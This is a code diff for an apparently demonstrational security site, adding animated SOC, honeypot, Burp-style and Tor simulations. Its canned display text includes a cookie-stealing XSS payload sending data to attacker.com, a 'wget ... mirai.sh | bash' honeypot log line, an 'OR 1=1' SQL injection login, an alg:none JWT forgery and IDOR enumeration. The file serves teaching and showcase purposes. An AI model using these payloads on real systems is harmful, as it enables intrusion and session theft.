+    ctx.strokeStyle='#00ff88';ctx.lineWidth=1.5;ctx.stroke();
+    ctx.fillStyle='#00d4ff';ctx.font='6px Share Tech Mono';ctx.textAlign='center';
+    ctx.fillText(h.ip.split('.').pop(),x,y+3);
+    ctx.fillStyle='rgba(184,220,237,.6)';ctx.fillText(h.hostname.split('.')[0],x,y-12);
+  });
+}
+
+// ─── SOC SIM ─────────────────────────────────────────
+function buildSOCSim(){
+  return `
+<div style="margin-bottom:1rem;display:flex;gap:.5rem;flex-wrap:wrap;">
+  <button class="tc-btn active" onclick="socTab('overview',this)">OVERVIEW</button>
+  <button class="tc-btn" onclick="socTab('alerts',this)">LIVE ALERTS</button>
+  <button class="tc-btn" onclick="socTab('network',this)">NETWORK MAP</button>
+  <button class="tc-btn" onclick="socTab('soar',this)">SOAR PLAYBOOK</button>
+  <button class="tc-btn" onclick="socTab('honeypot',this)">HONEYPOT</button>
+</div>
+<div id="soc-overview">
+  <div class="metric-row">
+    <div class="metric-box"><div class="metric-val red" id="m-critical">0</div><div class="metric-label">CRITICAL</div></div>
+    <div class="metric-box"><div class="metric-val orange" id="m-high">0</div><div class="metric-label">HIGH</div></div>
+    <div class="metric-box"><div class="metric-val blue" id="m-total">0</div><div class="metric-label">TOTAL EVENTS</div></div>
+    <div class="metric-box"><div class="metric-val green" id="m-agents">4</div><div class="metric-label">AGENTS ONLINE</div></div>
+  </div>
+  <div style="display:grid;grid-template-columns:2fr 1fr;gap:1rem;">
+    <div class="soc-panel">
+      <div class="soc-panel-title">WAZUH — LIVE ALERT FEED</div>
+      <div id="soc-alert-feed" style="max-height:250px;overflow-y:auto;"></div>
+    </div>
+    <div>
+      <div class="soc-panel" style="margin-bottom:1rem;">
+        <div class="soc-panel-title">ZEEK — NETWORK STATS</div>
+        <canvas id="zeek-chart" style="width:100%;height:120px;"></canvas>
+      </div>
+      <div class="soc-panel">
+        <div class="soc-panel-title">THREAT MAP</div>
+        <canvas id="threat-map-canvas"></canvas>
+      </div>
+    </div>
+  </div>
+</div>
+<div id="soc-alerts" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// WAZUH ALERT DETAIL FEED — LIVE</div>
+  <div class="terminal" id="soc-alert-term" style="height:400px;"></div>
+</div>
+<div id="soc-network" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// ZEEK — NETWORK TOPOLOGY MONITOR</div>
+  <canvas id="net-canvas"></canvas>
+  <div class="net-legend">
+    <div class="net-leg-item"><div class="net-dot" style="background:#00d4ff;"></div>Monitored Host</div>
+    <div class="net-leg-item"><div class="net-dot" style="background:#ff3860;"></div>Active Threat</div>
+    <div class="net-leg-item"><div class="net-dot" style="background:#00ff88;"></div>Clean Traffic</div>
+    <div class="net-leg-item"><div class="net-dot" style="background:#ff6b35;"></div>Anomaly Detected</div>
+  </div>
+</div>
+<div id="soc-soar" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// n8n SOAR — AUTOMATED PLAYBOOK EXECUTION</div>
+  <div id="soar-flow" style="background:#000;border:1px solid var(--border);padding:1.5rem;min-height:300px;"></div>
+</div>
+<div id="soc-honeypot" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// T-POT HONEYPOT — ATTACKER INTELLIGENCE</div>
+  <div class="terminal" id="honeypot-term" style="height:380px;"></div>
+</div>`;
+}
+
+let socIntervals=[];
+function runSOCSim(){
+  const feed=document.getElementById('soc-alert-feed');
+  const mCrit=document.getElementById('m-critical');
+  const mHigh=document.getElementById('m-high');
+  const mTotal=document.getElementById('m-total');
+  if(!feed)return;
+  let crit=0,high=0,total=0;
+  const alertDefs=[
+    {sev:'critical',msg:'Multiple failed SSH logins — brute force detected on 192.168.1.25',rule:'rule.id: 5763'},
+    {sev:'high',msg:'SQL injection pattern in HTTP request to /api/users',rule:'rule.id: 31103'},
+    {sev:'high',msg:'Unauthorized privilege escalation attempt via sudo',rule:'rule.id: 5402'},
+    {sev:'medium',msg:'Outbound connection to known C2 IP 185.234.219.x',rule:'rule.id: 20301'},
+    {sev:'critical',msg:'Ransomware IOC detected — file mass rename operation',rule:'rule.id: 87001'},
+    {sev:'low',msg:'Firewall rule modified on host windows-workstation',rule:'rule.id: 4358'},
+    {sev:'medium',msg:'Suspicious PowerShell execution with encoded command',rule:'rule.id: 91547'},
+    {sev:'high',msg:'Port scan from external IP 103.45.67.89 — 450 ports probed',rule:'rule.id: 40101'},
+    {sev:'info',msg:'Wazuh agent checkin: agent-04 (nas.local) reconnected',rule:'rule.id: 501'},
+    {sev:'medium',msg:'Zeek: Large data exfiltration attempt — 2.4GB DNS queries',rule:'rule.id: 60201'},
+    {sev:'critical',msg:'Authentication bypass on admin panel — unauthorized access',rule:'rule.id: 31151'},
+    {sev:'low',msg:'T-Pot honeypot: Mirai variant detected on cowrie SSH trap',rule:'rule.id: 99001'},
+  ];
+  let ai=0;
+  const alertInterval=setInterval(()=>{
+    const a=alertDefs[ai%alertDefs.length];ai++;
+    total++;if(a.sev==='critical')crit++;if(a.sev==='high')high++;
+    if(mCrit)mCrit.textContent=crit;if(mHigh)mHigh.textContent=high;if(mTotal)mTotal.textContent=total;
+    if(!feed)return;
+    const now=new Date().toLocaleTimeString();
+    const row=document.createElement('div');
+    row.className=`alert-row ${a.sev}`;
+    row.innerHTML=`<span class="alert-sev ${a.sev}">${a.sev.toUpperCase()}</span><span class="alert-msg">${a.msg}</span><span class="alert-time">${now}</span>`;
+    feed.insertBefore(row,feed.firstChild);
+    if(feed.children.length>20)feed.removeChild(feed.lastChild);
+  },2000);
+  socIntervals.push(alertInterval);
+  // zeek chart
+  setTimeout(()=>drawZeekChart(),100);
+  // threat map
+  setTimeout(()=>drawThreatMap(),100);
+}
+
+function drawZeekChart(){
+  const c=document.getElementById('zeek-chart');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=120;
+  const data=Array.from({length:20},()=>Math.random()*80+20);
+  let t=0;
+  function draw(){
+    ctx.fillStyle='#000';ctx.fillRect(0,0,c.width,c.height);
+    t++;
+    if(t%5===0){data.shift();data.push(Math.random()*80+20);}
+    ctx.beginPath();
+    data.forEach((v,i)=>{const x=i/(data.length-1)*c.width,y=c.height-v/100*c.height;i===0?ctx.moveTo(x,y):ctx.lineTo(x,y);});
+    ctx.strokeStyle='#00d4ff';ctx.lineWidth=2;ctx.stroke();
+    // fill
+    ctx.lineTo(c.width,c.height);ctx.lineTo(0,c.height);ctx.closePath();
+    ctx.fillStyle='rgba(0,212,255,.08)';ctx.fill();
+    ctx.fillStyle='rgba(0,212,255,.4)';ctx.font='7px Share Tech Mono';ctx.textAlign='left';
+    ctx.fillText('CONN/s: '+Math.round(data[data.length-1]),4,12);
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function drawThreatMap(){
+  const c=document.getElementById('threat-map-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=150;
+  const threats=[];
+  function addThreat(){threats.push({x:Math.random()*c.width,y:Math.random()*c.height,tx:c.width*.4+Math.random()*c.width*.2,ty:c.height/2,r:0,maxR:3+Math.random()*4,alpha:1,color:['#ff3860','#ff6b35','#b060ff'][Math.floor(Math.random()*3)]});}
+  const ti=setInterval(addThreat,1500);socIntervals.push(ti);
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.15)';ctx.fillRect(0,0,c.width,c.height);
+    // simplified world shape
+    ctx.fillStyle='rgba(14,74,110,.3)';ctx.fillRect(10,20,c.width-20,c.height-40);
+    ctx.strokeStyle='rgba(14,74,110,.5)';ctx.strokeRect(10,20,c.width-20,c.height-40);
+    // target (Nairobi)
+    const nx=c.width*.65,ny=c.height*.55;
+    ctx.beginPath();ctx.arc(nx,ny,5,0,Math.PI*2);ctx.fillStyle='#00d4ff';ctx.fill();
+    ctx.fillStyle='rgba(0,212,255,.5)';ctx.font='7px Share Tech Mono';ctx.textAlign='center';ctx.fillText('NBI',nx,ny-8);
+    threats.forEach((t,i)=>{
+      t.r+=.08;t.alpha-=.008;
+      if(t.alpha<=0){threats.splice(i,1);return;}
+      // animated line
+      const prog=Math.min(1,t.r/t.maxR);
+      const cx2=t.x+(t.tx-t.x)*prog,cy2=t.y+(t.ty-t.y)*prog;
+      ctx.beginPath();ctx.moveTo(t.x,t.y);ctx.lineTo(cx2,cy2);
+      ctx.strokeStyle=t.color+Math.round(t.alpha*80).toString(16).padStart(2,'0');ctx.lineWidth=1;ctx.stroke();
+      ctx.beginPath();ctx.arc(cx2,cy2,2,0,Math.PI*2);ctx.fillStyle=t.color;ctx.fill();
+    });
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+let socActiveTab='overview';
+function socTab(tab,btn){
+  ['overview','alerts','network','soar','honeypot'].forEach(t=>{
+    const el=document.getElementById('soc-'+t);if(el)el.style.display='none';
+  });
+  document.querySelectorAll('.tc-btn').forEach(b=>b.classList.remove('active'));
+  if(btn)btn.classList.add('active');
+  const el=document.getElementById('soc-'+tab);if(el)el.style.display='block';
+  socActiveTab=tab;
+  if(tab==='network')setTimeout(drawNetworkTopology,100);
+  if(tab==='alerts')setTimeout(runAlertTerminal,100);
+  if(tab==='soar')setTimeout(drawSOARFlow,100);
+  if(tab==='honeypot')setTimeout(runHoneypot,100);
+}
+
+function drawNetworkTopology(){
+  const c=document.getElementById('net-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=350;
+  const nodes=[
+    {x:c.width/2,y:c.height/2,label:'SIEM\nWazuh',color:'#00d4ff',r:18,type:'siem'},
+    {x:c.width*.2,y:c.height*.25,label:'WebSrv\n192.168.1.10',color:'#ff6b35',r:14,type:'threat'},
+    {x:c.width*.8,y:c.height*.25,label:'WinWS\n192.168.1.25',color:'#00ff88',r:12,type:'host'},
+    {x:c.width*.15,y:c.height*.7,label:'NAS\n192.168.1.50',color:'#00ff88',r:12,type:'host'},
+    {x:c.width*.85,y:c.height*.7,label:'Honeypot\nT-Pot',color:'#b060ff',r:12,type:'honeypot'},
+    {x:c.width*.5,y:c.height*.1,label:'Router\n192.168.1.1',color:'#00d4ff',r:12,type:'host'},
+    {x:c.width*.35,y:c.height*.8,label:'Zeek\nMonitor',color:'#00d4ff',r:10,type:'siem'},
+    {x:c.width*.65,y:c.height*.85,label:'n8n\nSOAR',color:'#b060ff',r:10,type:'soar'},
+  ];
+  const edges=[[0,1],[0,2],[0,3],[0,4],[0,5],[0,6],[0,7],[5,1],[5,2],[5,3]];
+  const packets=[];
+  setInterval(()=>{
+    const e=edges[Math.floor(Math.random()*edges.length)];
+    packets.push({a:nodes[e[0]],b:nodes[e[1]],p:0,color:Math.random()>.7?'#ff3860':'#00d4ff',alert:Math.random()>.8});
+  },600);
+  let t=0;
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.15)';ctx.fillRect(0,0,c.width,c.height);
+    t++;
+    edges.forEach(([a,b])=>{
+      const na=nodes[a],nb=nodes[b];
+      ctx.beginPath();ctx.moveTo(na.x,na.y);ctx.lineTo(nb.x,nb.y);
+      ctx.strokeStyle='rgba(14,74,110,.5)';ctx.lineWidth=1;ctx.stroke();
+    });
+    packets.forEach((pk,i)=>{
+      pk.p+=.015;if(pk.p>=1){packets.splice(i,1);return;}
+      const x=pk.a.x+(pk.b.x-pk.a.x)*pk.p,y=pk.a.y+(pk.b.y-pk.a.y)*pk.p;
+      ctx.beginPath();ctx.arc(x,y,3,0,Math.PI*2);ctx.fillStyle=pk.color;ctx.fill();
+      if(pk.alert){ctx.beginPath();ctx.arc(x,y,6,0,Math.PI*2);ctx.strokeStyle=pk.color+'66';ctx.lineWidth=1;ctx.stroke();}
+    });
+    nodes.forEach(n=>{
+      const pulse=Math.sin(t*.05)*3;
+      ctx.beginPath();ctx.arc(n.x,n.y,n.r+pulse,0,Math.PI*2);
+      ctx.fillStyle=n.color+'22';ctx.fill();
+      ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);
+      ctx.fillStyle=n.color+'33';ctx.fill();ctx.strokeStyle=n.color;ctx.lineWidth=2;ctx.stroke();
+      ctx.fillStyle=n.color;ctx.font='bold 7px Share Tech Mono';ctx.textAlign='center';
+      n.label.split('\n').forEach((l,li)=>ctx.fillText(l,n.x,n.y-4+li*10));
+    });
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function runAlertTerminal(){
+  const term=document.getElementById('soc-alert-term');
+  if(!term)return;
+  const alerts=[
+    {sev:'CRITICAL',color:'t-err',rule:'rule.id:5763 level:15',src:'192.168.1.25',msg:'authentication_failed: max_auth_tries exceeded',count:427},
+    {sev:'HIGH',color:'t-warn',rule:'rule.id:31103 level:12',src:'10.0.0.15',msg:'web_attack: SQL injection attempt in query string',count:1},
+    {sev:'HIGH',color:'t-warn',rule:'rule.id:5402 level:10',src:'192.168.1.10',msg:'sudo: user www-data executed /bin/bash',count:3},
+    {sev:'MEDIUM',color:'t-info',rule:'rule.id:20301 level:8',src:'192.168.1.10',msg:'network_anomaly: connection to threat intel blacklist',count:1},
+    {sev:'CRITICAL',color:'t-err',rule:'rule.id:87001 level:15',src:'192.168.1.25',msg:'ransomware_activity: mass file rename with .LOCKED extension',count:1},
+    {sev:'LOW',color:'t-comment',rule:'rule.id:4358 level:5',src:'192.168.1.1',msg:'firewall_rule_modified: accept → drop on chain INPUT',count:1},
+  ];
+  let ai=0;
+  function addAlert(){
+    if(!document.getElementById('soc-alert-term'))return;
+    const a=alerts[ai%alerts.length];ai++;
+    const ts=new Date().toISOString();
+    const div=document.createElement('div');div.className='t-line';
+    div.innerHTML=`<span class="t-comment">${ts} </span><span class="${a.color}">[${a.sev}] </span><span class="t-dim">${a.rule} </span><span class="t-out">src:${a.src} </span><span class="t-cmd">${a.msg}</span>`;
+    term.appendChild(div);
+    term.scrollTop=term.scrollHeight;
+  }
+  const iv=setInterval(addAlert,1200);socIntervals.push(iv);
+}
+
+function drawSOARFlow(){
+  const container=document.getElementById('soar-flow');
+  if(!container)return;
+  const steps=[
+    {icon:'🔔',title:'TRIGGER',desc:'Wazuh fires critical alert\nrule.id:5763 level:15',color:'#ff3860',status:'complete'},
+    {icon:'🔍',title:'ENRICH',desc:'Query threat intel APIs\nVirusTotal, AbuseIPDB',color:'#ff6b35',status:'complete'},
+    {icon:'🧠',title:'CORRELATE',desc:'Match against known IOCs\nBehavioral analysis engine',color:'#b060ff',status:'running'},
+    {icon:'🚫',title:'CONTAIN',desc:'Auto-block source IP\nFirewall + WAF rule push',color:'#00d4ff',status:'pending'},
+    {icon:'📧',title:'NOTIFY',desc:'PagerDuty + Slack alert\nEmail to security team',color:'#00ff88',status:'pending'},
+    {icon:'📋',title:'TICKET',desc:'Create Jira incident\nAssign to SOC analyst',color:'#00ff88',status:'pending'},
+  ];
+  container.innerHTML='<div style="display:flex;flex-wrap:wrap;gap:.8rem;align-items:center;">'
+    +steps.map((s,i)=>`
+    <div style="background:#000;border:1px solid ${s.status==='running'?s.color:'var(--border)'};padding:1rem;min-width:130px;text-align:center;position:relative;${s.status==='running'?'box-shadow:0 0 15px '+s.color+'44;':''}">
+      ${s.status==='running'?'<div style="position:absolute;top:0;left:0;right:0;height:2px;background:'+s.color+';animation:dataStream 2s linear infinite;"></div>':''}
+      <div style="font-size:1.5rem;margin-bottom:.4rem;">${s.icon}</div>
+      <div style="font-family:var(--mono);font-size:.65rem;color:${s.status==='complete'?'#00ff88':s.status==='running'?s.color:'var(--dim)'};letter-spacing:2px;margin-bottom:.3rem;">${s.title}</div>
+      <div style="font-size:.7rem;color:var(--text);white-space:pre-line;line-height:1.4;">${s.desc}</div>
+      <div style="margin-top:.5rem;font-family:var(--mono);font-size:.55rem;color:${s.status==='complete'?'#00ff88':s.status==='running'?s.color:'#3d7a99'};">${s.status==='complete'?'✓ DONE':s.status==='running'?'● RUNNING':'○ PENDING'}</div>
+    </div>
+    ${i<steps.length-1?'<div style="color:var(--dim);font-size:1.2rem;">→</div>':''}
+  `).join('')+'</div>';
+  // animate pending → running → complete
+  let si=3;
+  const autoAdvance=setInterval(()=>{
+    if(si>=steps.length){clearInterval(autoAdvance);return;}
+    steps[si-1].status='complete';
+    steps[si].status='running';
+    si++;
+    drawSOARFlow();
+    if(si===steps.length+1){clearInterval(autoAdvance);steps[si-1].status='complete';drawSOARFlow();}
+  },2500);
+  socIntervals.push(autoAdvance);
+}
+
+function runHoneypot(){
+  const term=document.getElementById('honeypot-term');
+  if(!term)return;
+  const events=[
+    {t:'INFO',c:'t-info',m:'T-Pot honeypot started — cowrie SSH v2.4.0 listening on :22'},
+    {t:'INFO',c:'t-info',m:'dionaea FTP trap active on :21 — ready to capture'},
+    {t:'CONN',c:'t-success',m:'New connection: 185.234.219.47 → :22 (SSH) [Country: RU]'},
+    {t:'AUTH',c:'t-warn',m:'Login attempt: admin:admin — FAILED (intentionally)'},
+    {t:'AUTH',c:'t-warn',m:'Login attempt: root:123456 — FAILED'},
+    {t:'AUTH',c:'t-warn',m:'Login attempt: pi:raspberry — FAILED'},
+    {t:'AUTH',c:'t-success',m:'Login SUCCESS: root:password — attacker is IN the honeypot'},
+    {t:'CMD',c:'t-err',m:'Attacker ran: uname -a; whoami; id'},
+    {t:'CMD',c:'t-err',m:'Attacker ran: wget http://185.x.x.x/mirai.sh | bash'},
+    {t:'IOC',c:'t-err',m:'MALWARE DETECTED: Mirai botnet dropper SHA256:3f9a2e...'},
+    {t:'INTEL',c:'t-success',m:'IOC logged → feeding to Wazuh SIEM for correlation'},
+    {t:'INTEL',c:'t-success',m:'Attacker IP 185.234.219.47 added to threat intel blocklist'},
+    {t:'CONN',c:'t-info',m:'New connection: 103.45.67.89 → :21 (FTP) [Country: CN]'},
+    {t:'CMD',c:'t-warn',m:'FTP recon: LIST, CWD /uploads, STOR shell.php'},
+    {t:'IOC',c:'t-err',m:'Webshell upload attempt captured → sample preserved'},
+    {t:'INTEL',c:'t-success',m:'Behavior fingerprinted — APT-like TTPs detected'},
+  ];
+  let i=0;
+  function addEvent(){
+    if(!document.getElementById('honeypot-term')||i>=events.length){i=0;return;}
+    const e=events[i++];
+    const ts=new Date().toLocaleTimeString();
+    const d=document.createElement('div');d.className='t-line';
+    d.innerHTML=`<span class="t-comment">${ts} </span><span class="${e.c}">[${e.t}] </span><span class="t-out">${e.m}</span>`;
+    term.appendChild(d);term.scrollTop=term.scrollHeight;
+  }
+  const iv=setInterval(addEvent,1000);socIntervals.push(iv);
+}
+
+// ─── BURP SIM ────────────────────────────────────────
+function buildBurpSim(){
+  return `
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;">
+  <div>
+    <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// ATTACK SELECTION</div>
+    <select id="burp-attack" style="width:100%;background:#000;border:1px solid var(--border);color:var(--c1);font-family:var(--mono);font-size:.7rem;padding:.5rem;margin-bottom:.5rem;outline:none;">
+      <option value="sqli">SQL Injection — UNION-based</option>
+      <option value="xss">XSS — Reflected</option>
+      <option value="authbypass">Authentication Bypass</option>
+      <option value="idor">IDOR — Insecure Direct Object Ref</option>
+    </select>
+    <button onclick="runBurpAttack()" class="tc-btn" style="width:100%;padding:.6rem;">▶ INTERCEPT &amp; EXPLOIT</button>
+    <div style="margin-top:1rem;font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// HTTP INTERCEPT</div>
+    <div style="background:#000;border:1px solid var(--c5);padding:1rem;font-family:var(--mono);font-size:.65rem;min-height:150px;" id="burp-intercept">
+      <div style="color:var(--c5);">// Waiting for traffic...</div>
+    </div>
+  </div>
+  <div>
+    <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// SCANNER OUTPUT</div>
+    <div class="terminal" id="burp-term" style="height:400px;"></div>
+  </div>
+</div>`;
+}
+
+function runBurpSim(){}
+
+function runBurpAttack(){
+  const type=document.getElementById('burp-attack').value;
+  const term=document.getElementById('burp-term');
+  const intercept=document.getElementById('burp-intercept');
+  if(!term||!intercept)return;
+  term.innerHTML='';
+  function tl(html,delay){setTimeout(()=>{const d=document.createElement('div');d.className='t-line';d.innerHTML=html;term.appendChild(d);term.scrollTop=term.scrollHeight;},delay);}
+  if(type==='sqli'){
+    intercept.innerHTML=`<span style="color:#00d4ff;">POST</span> <span style="color:#00ff88;">/api/login</span> <span style="color:#3d7a99;">HTTP/1.1</span>
+<span style="color:#3d7a99;">Host: target.site</span>
+<span style="color:#3d7a99;">Content-Type: application/x-www-form-urlencoded</span>
+<br>
+<span style="color:#ff6b35;">username=</span><span style="color:#ff3860;">admin' OR '1'='1' -- -</span>
+<span style="color:#ff6b35;">&amp;password=</span><span style="color:#ff3860;">anything</span>`;
+    tl('<span class="t-info">[*] SQLmap v1.8.4 — SQL injection scanner</span>',0);
+    tl('<span class="t-info">[*] Testing connection to http://target.site/api/login</span>',300);
+    tl('<span class="t-out">[*] Testing parameter: username</span>',600);
+    tl('<span class="t-success">[+] Parameter username appears to be injectable</span>',1200);
+    tl('<span class="t-success">[+] Detected: MySQL >= 5.6.0</span>',1800);
+    tl('<span class="t-warn">[!] Trying UNION-based injection...</span>',2200);
+    tl('<span class="t-success">[+] UNION based injection: ORDER BY technique — columns: 3</span>',3000);
+    tl('<span class="t-err">[CRITICAL] SQL injection confirmed!</span>',3800);
+    tl('<span class="t-out">[*] Fetching databases...</span>',4200);
+    tl('<span class="t-success">[+] available databases: [app_db, mysql, information_schema, users]</span>',5000);
+    tl('<span class="t-out">[*] Fetching tables from app_db...</span>',5500);
+    tl('<span class="t-success">[+] Tables: users, admin_users, sessions, transactions, api_keys</span>',6200);
+    tl('<span class="t-warn">[!] Dumping users table...</span>',6800);
+    tl('<span class="t-err">[CRITICAL] Data extracted:</span>',7500);
+    tl('<span class="t-out">| ID | username | password_hash                    | role  |</span>',7700);
+    tl('<span class="t-out">| 1  | admin    | $2b$10$hashed_bcrypt_password       | admin |</span>',7900);
+    tl('<span class="t-out">| 2  | jsmith   | $2b$10$another_hash                  | user  |</span>',8100);
+    tl('<span class="t-success">[+] Vulnerability documented for responsible disclosure</span>',9000);
+  }else if(type==='xss'){
+    intercept.innerHTML=`<span style="color:#00d4ff;">GET</span> <span style="color:#00ff88;">/search?q=</span><span style="color:#ff3860;">&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</span> <span style="color:#3d7a99;">HTTP/1.1</span>`;
+    tl('<span class="t-info">[*] XSS Scanner — testing reflected injection</span>',0);
+    tl('<span class="t-out">[*] Payload: &lt;script&gt;alert(document.domain)&lt;/script&gt;</span>',400);
+    tl('<span class="t-success">[+] REFLECTED XSS found in /search?q= parameter</span>',1200);
+    tl('<span class="t-warn">[!] Crafting cookie-stealing payload...</span>',1800);
+    tl('<span class="t-err">[CRITICAL] Cookie theft payload confirmed executable</span>',2600);
+    tl('<span class="t-out">[*] Impact: Session hijacking, admin takeover possible</span>',3200);
+    tl('<span class="t-success">[+] Severity: HIGH — reported for immediate patch</span>',4000);
+  }else if(type==='authbypass'){
+    intercept.innerHTML=`<span style="color:#00d4ff;">GET</span> <span style="color:#00ff88;">/admin/dashboard</span> <span style="color:#3d7a99;">HTTP/1.1</span>
+<span style="color:#3d7a99;">Authorization: Bearer </span><span style="color:#ff3860;">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</span>`;
+    tl('<span class="t-info">[*] JWT Analysis — checking algorithm confusion</span>',0);
+    tl('<span class="t-out">[*] Decoded header: {"alg":"HS256","typ":"JWT"}</span>',400);
+    tl('<span class="t-warn">[!] Testing alg:none attack...</span>',900);
+    tl('<span class="t-err">[CRITICAL] Server accepts JWT with alg:none — BYPASS CONFIRMED</span>',1800);
+    tl('<span class="t-out">[*] Forged admin token: {"user":"admin","role":"superadmin"}</span>',2400);
+    tl('<span class="t-success">[+] Admin panel accessible without valid credentials</span>',3200);
+    tl('<span class="t-err">[CRITICAL] Full admin access — password reset, user enumeration possible</span>',4000);
+  }else if(type==='idor'){
+    intercept.innerHTML=`<span style="color:#00d4ff;">GET</span> <span style="color:#00ff88;">/api/users/</span><span style="color:#ff3860;">1001</span><span style="color:#00ff88;">/profile</span> <span style="color:#3d7a99;">HTTP/1.1</span>
+<span style="color:#3d7a99;">Cookie: session=abc123 (authenticated as user_id=1337)</span>`;
+    tl('<span class="t-info">[*] IDOR Scanner — enumerating user IDs</span>',0);
+    tl('<span class="t-out">[*] Own profile /api/users/1337 → HTTP 200</span>',400);
+    tl('<span class="t-warn">[!] Testing adjacent ID: /api/users/1001...</span>',900);
+    tl('<span class="t-err">[CRITICAL] HTTP 200 — unauthorized profile data returned!</span>',1600);
+    tl('<span class="t-out">[*] Response: {"id":1001,"email":"victim@target.com","address":"...","payment":"****4242"}',2200);
+    tl('<span class="t-err">[CRITICAL] IDOR confirmed — horizontal privilege escalation</span>',3000);
+    tl('<span class="t-out">[*] Scope: All user IDs accessible — 45,000+ user records exposed</span>',3800);
+    tl('<span class="t-success">[+] Documented with PoC for responsible disclosure</span>',4800);
+  }
+}
+
+// ─── TOR SIM ─────────────────────────────────────────
+function buildTorSim(){
+  return `
+<div style="margin-bottom:1rem;">
+  <div style="display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap;">
+    <button class="tc-btn active" onclick="torTab('circuit',this)">TOR CIRCUIT</button>
+    <button class="tc-btn" onclick="torTab('tails',this)">TAILS OS</button>
+    <button class="tc-btn" onclick="torTab('comms',this)">ENCRYPTED COMMS</button>
+  </div>
+  <div id="tor-circuit">
+    <canvas id="tor-canvas" style="width:100%;height:300px;background:#000;border:1px solid var(--border);"></canvas>
+    <div style="margin-top:1rem;font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// CIRCUIT STATUS</div>
+    <div id="tor-status" style="display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;"></div>
+  </div>
+  <div id="tor-tails" style="display:none;">
+    <div class="terminal" id="tails-term" style="height:380px;"></div>
+  </div>
+  <div id="tor-comms" style="display:none;">
+    <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:1rem;">// END-TO-END ENCRYPTED MESSAGE SIMULATION</div>
+    <div id="comms-flow"></div>
+    <div style="margin-top:1.5rem;">
+      <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// LAYER ENCRYPTION VISUALIZATION</div>
+      <div id="onion-layers" style="display:flex;flex-direction:column;gap:.4rem;"></div>
+    </div>
+  </div>
+</div>`;
+}
+
+function runTorSim(){
+  const c=document.getElementById('tor-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=300;
+  // Define full circuit
+  const nodes=[
+    {x:c.width*.05,y:c.height*.5,label:'TAILS OS\n(You)',color:'#00ff88',type:'client'},
+    {x:c.width*.22,y:c.height*.25,label:'GUARD NODE\nDE: 185.x.x.x',color:'#00d4ff',type:'guard'},
+    {x:c.width*.4,y:c.height*.7,label:'MIDDLE NODE\nNL: 194.x.x.x',color:'#00d4ff',type:'middle'},
+    {x:c.width*.58,y:c.height*.3,label:'RELAY\nSE: 178.x.x.x',color:'#00d4ff',type:'relay'},
+    {x:c.width*.75,y:c.height*.65,label:'EXIT NODE\nFI: 45.x.x.x',color:'#ff6b35',type:'exit'},
+    {x:c.width*.93,y:c.height*.4,label:'TARGET\nserver.onion',color:'#b060ff',type:'dest'},
+  ];
+  const path=nodes;
+  let packetP=0,tick=0;
+  // status
+  const statusBox=document.getElementById('tor-status');
+  if(statusBox) statusBox.innerHTML=nodes.map(n=>`<div style="background:#000;border:1px solid ${n.color}22;padding:.5rem;text-align:center;">
+    <div style="color:${n.color};font-family:var(--mono);font-size:.6rem;">${n.type.toUpperCase()}</div>
+    <div style="color:var(--dim);font-size:.55rem;font-family:var(--mono);">${n.label.split('\n')[1]||'—'}</div>
+    <div style="color:#00ff88;font-size:.5rem;font-family:var(--mono);">● ENCRYPTED</div>
+  </div>`).join('');
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.2)';ctx.fillRect(0,0,c.width,c.height);
+    tick++;
+    // draw path
+    for(let i=0;i<path.length-1;i++){
+      const a=path[i],b=path[i+1];
+      ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
+      ctx.strokeStyle='rgba(0,255,136,.2)';ctx.lineWidth=2;ctx.stroke();
+      // encryption layer label
+      const mx=(a.x+b.x)/2,my=(a.y+b.y)/2;
+      ctx.fillStyle='rgba(0,255,136,.4)';ctx.font='6px Share Tech Mono';ctx.textAlign='center';
+      ctx.fillText('AES-256',mx,my-6);
+    }
+    // nodes
+    path.forEach(n=>{
+      const pulse=Math.sin(tick*.08+n.x)*3;
+      ctx.beginPath();ctx.arc(n.x,n.y,16+pulse,0,Math.PI*2);
+      ctx.fillStyle=n.color+'11';ctx.fill();
+      ctx.beginPath();ctx.arc(n.x,n.y,13,0,Math.PI*2);
+      ctx.fillStyle=n.color+'22';ctx.fill();ctx.strokeStyle=n.color;ctx.lineWidth=2;ctx.stroke();
+      ctx.fillStyle=n.color;ctx.font='bold 7px Share Tech Mono';ctx.textAlign='center';
+      n.label.split('\n').forEach((l,li)=>ctx.fillText(l,n.x,n.y-4+li*9));
+    });
+    // animated packet (onion)
+    const seg=Math.floor(packetP*(path.length-1));
+    const frac=(packetP*(path.length-1))-seg;
+    if(seg<path.length-1){
